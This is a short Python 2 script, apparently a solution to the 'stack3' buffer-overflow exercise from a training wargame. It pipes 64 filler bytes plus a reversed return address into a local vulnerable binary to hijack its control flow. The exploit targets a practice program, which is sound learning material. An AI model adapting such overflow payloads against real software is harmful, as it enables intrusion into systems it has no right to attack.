#!/usr/bin/env python2.6

from subprocess import Popen, PIPE

p = Popen("/home/adam/stack3",stdin=PIPE)

flag = reversed('\x08\x04\x84\x24')

payload = "A" * 64 + "".join(flag)

p.communicate(payload)
